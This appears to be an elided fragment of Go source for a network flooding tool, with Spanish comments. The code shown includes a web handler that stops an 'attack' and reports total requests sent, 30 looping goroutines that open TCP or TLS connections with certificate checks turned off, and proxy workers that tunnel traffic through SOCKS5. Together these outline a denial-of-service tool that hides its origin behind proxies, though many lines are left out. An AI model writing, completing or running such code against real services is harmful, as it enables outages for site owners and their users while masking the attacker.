...
func handleParar(w http.ResponseWriter, r *http.Request) {
	detenerAtaque()
	logMsg("[!] Operación detenida. Total peticiones enviadas: %d", atomic.LoadUint64(&totalRequests))
}
	...
	for w := 0; w < 30; w++ {
		...
		go func() {
			...
			for {
				...
				if tInfo.IsTLS {
					// Conexión segura con TLS (HTTPS / Puerto 443 cifrado)
					dialer := &net.Dialer{Timeout: 1 * time.Second}
					conn, err = tls.DialWithDialer(dialer, "tcp", addr, &tls.Config{
						InsecureSkipVerify: true, // Omite validación estricta de certificados para pruebas
					})
				} else {
					// Conexión TCP plana normal (HTTP)
		...
		go func(pProxy string, tProxy string) {
			...
			for {
				...
				if tProxy == "socks5" {
					...
					// Si el destino usa HTTPS a través del proxy SOCKS5, envolvemos la conexión con TLS sobre el socket del proxy
					if tInfo.IsTLS {
